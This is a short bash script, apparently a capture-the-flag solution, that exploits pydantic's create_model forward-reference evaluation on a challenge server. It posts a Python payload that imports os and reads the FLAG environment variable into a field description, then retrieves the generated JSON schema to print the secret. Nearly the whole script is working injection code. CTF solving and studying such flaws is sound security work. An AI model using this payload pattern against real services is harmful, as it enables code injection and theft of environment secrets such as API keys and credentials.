#!/usr/bin/env bash
# Exploit pydantic.create_model forward-ref eval to leak $FLAG via the
# generated JSON schema's field description.
set -eu
URL="${1:-https://deep-fried-meatball-drizzled-with-toasted-rosemary-lulg.gpn24.ctf.kitctf.de}"
NAME="exploit_$RANDOM"

PAYLOAD='__import__("typing").Annotated[str, __import__("pydantic").Field(description=__import__("os").environ["FLAG"])]'

curl -sk -X POST "$URL/blueprint/$NAME" \
  -H 'Content-Type: application/json' \
  --data "$(python3 -c 'import json,sys; print(json.dumps({"x": sys.argv[1]}))' "$PAYLOAD")" \
  >/dev/null

curl -sk "$URL/blueprint/$NAME" \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["properties"]["x"]["description"])'
